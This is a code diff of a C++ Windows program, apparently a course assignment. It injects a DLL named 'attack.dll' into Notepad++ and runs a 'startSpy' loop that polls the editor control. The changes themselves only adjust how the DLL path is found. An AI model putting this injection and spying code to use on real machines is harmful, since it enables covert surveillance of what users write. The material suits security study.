@@ -65,7 +65,7 @@ void startSpy(HWND hwnd) {
     }
 
     /*std::cout << myDocumentsPath << std::endl;*/
-     /*Create the full path for the log file*/
+    /*Create the full path for the log file*/
     while (true) {
         HWND hEdit = FindWindowEx(hwnd, NULL, L"Scintilla", NULL);
         if (hEdit) {
@@ -89,13 +89,22 @@ void startSpy(HWND hwnd) {
         Sleep(1000);
     }
 }
+
+std::string GetCurrentExecutablePath() {
+    char path[MAX_PATH];
+    GetModuleFileNameA(NULL, path, MAX_PATH);
+    std::string::size_type pos = std::string(path).find_last_of("\\/");
+    return std::string(path).substr(0, pos);
+}
 int main()
 {
     /*const char* dllPath = "C:\\Users\\KOREA\\Desktop\\attack\\Release\\attack.dll";*/
-    const char* dllPath = "C:\\Users\\mm0ck3r\\Desktop\\lesson37\\assign06\\Project_real\\Release\\Dll.dll";
+    /*const char* dllPath = "C:\\Users\\mm0ck3r\\Desktop\\lesson37\\assign06\\Project_real\\Release\\Dll.dll";*/
+    /*std::cout << GetCurrentExecutablePath() << std::endl;*/
+    std::string dllPath = GetCurrentExecutablePath() + "\\attack.dll";
     DWORD processID = 0;
     HWND hwnd;
-    if (GetFileAttributesA(dllPath) == 0xffffffff) {
+    if (GetFileAttributesA(dllPath.c_str()) == 0xffffffff) {
         printf("dll not found!\n");
         return 1;
     }
@@ -105,7 +114,7 @@ int main()
         if (hwnd)
         {
             GetWindowThreadProcessId(hwnd, &processID);
-            InjectDLL(processID, dllPath);
+            InjectDLL(processID, dllPath.c_str());
             break;
         }
         Sleep(500);
@@ -120,6 +129,5 @@ int main()
         }
         printf("say 'y' when you want to spy on the notepad++: ");
     }
-    ;
     return 0;
 }
